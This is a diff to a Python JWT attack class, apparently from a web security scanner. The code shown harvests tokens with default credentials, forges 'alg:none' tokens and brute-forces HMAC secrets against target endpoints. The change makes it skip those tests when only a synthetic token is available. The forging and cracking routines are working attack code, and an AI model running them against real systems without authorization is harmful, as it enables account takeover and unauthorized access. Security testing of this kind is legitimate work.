@@ -204,6 +204,7 @@ class TokenSniper:
 
     async def harvest_tokens(self, sess):
         print("\n[*] Harvesting JWT tokens from login endpoints...")
+        self._synth_only = False
         for ep in LOGIN_ENDPOINTS:
             for creds in [{"email": "test@t.com", "password": "test"},
                           {"username": "admin", "password": "admin"}]:
@@ -215,14 +216,15 @@ class TokenSniper:
                 for v in hdrs.values():
                     tokens.extend(JWT_PATTERN.findall(v))
                 if tokens:
-                    self._tokens.extend(tokens[:3])
+                    self._tokens.extend(t for t in tokens[:3] if not t.endswith(".synth"))
                     break
         if not self._tokens:
-            # Synthetic token for structural analysis
+            # Synthetic token for structural analysis ONLY — skip attack tests
             h = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
             p = _b64url_encode(json.dumps({"sub": "1", "role": "user", "iat": int(time.time())}).encode())
             self._tokens = [f"{h}.{p}.synth"]
-        print(f"  [+] Tokens available: {len(self._tokens)}")
+            self._synth_only = True
+        print(f"  [+] Tokens available: {len(self._tokens)} {'(synthetic — attack tests skipped)' if self._synth_only else ''}")
 
     async def analyse_structure(self, sess):
         print("\n[*] Analysing JWT structure and claims...")
@@ -269,13 +271,18 @@ class TokenSniper:
 
     async def test_alg_none(self, sess):
         print("\n[*] Testing JWT alg:none bypass (5 variants)...")
+        if getattr(self, "_synth_only", False):
+            print("  [-] Skipping — no real token harvested (synthetic token only)")
+            return
         for token in self._tokens[:2]:
+            if token.endswith(".synth"):
+                continue
             for forged in _forge_none(token)[:6]:
                 for path in ME_PATHS[:3]:
                     url = self.target + path
                     s, body, _ = await self._get(sess, url, headers={"Authorization": f"Bearer {forged}"})
                     await delay(0.05)
-                    if s in (200, 201) and body and '"id"' in body:
+                    if is_real_200(s) and body and '"id"' in body:
                         self._add(self._finding("JWT_ALG_NONE_BYPASS", "CRITICAL", 97,
                             f"GET {url}\n  Bearer {forged[:60]}...\n  HTTP {s}\n  Body: {body[:200]}",
                             f"JWT alg:none bypass confirmed at {path} — server accepts unsigned tokens.",
@@ -285,7 +292,12 @@ class TokenSniper:
 
     async def test_weak_secret(self, sess):
         print(f"\n[*] Brute-forcing JWT secrets ({len(WEAK_SECRETS)} candidates)...")
+        if getattr(self, "_synth_only", False):
+            print("  [-] Skipping — no real token harvested (synthetic token only)")
+            return
         for token in self._tokens[:2]:
+            if token.endswith(".synth"):
+                continue
             dec = _decode_jwt(token)
             if not dec or dec[0].get("alg", "").upper() not in ("HS256", "HS384", "HS512"):
                 continue
@@ -297,7 +309,7 @@ class TokenSniper:
                     url = self.target + path
                     s, body, _ = await self._get(sess, url, headers={"Authorization": f"Bearer {forged}"})
                     await delay(0.03)
-                    if s in (200, 201) and body and '"id"' in body:
+                    if is_real_200(s) and body and '"id"' in body:
                         self._add(self._finding("JWT_WEAK_SECRET", "CRITICAL", 98,
                             f"Secret cracked: '{secret}'\nGET {url}\n  Forged admin token accepted\n  HTTP {s}\n  Body: {body[:200]}",
                             f"JWT HMAC secret is '{secret}' — tokens fully forgeable with arbitrary claims.",
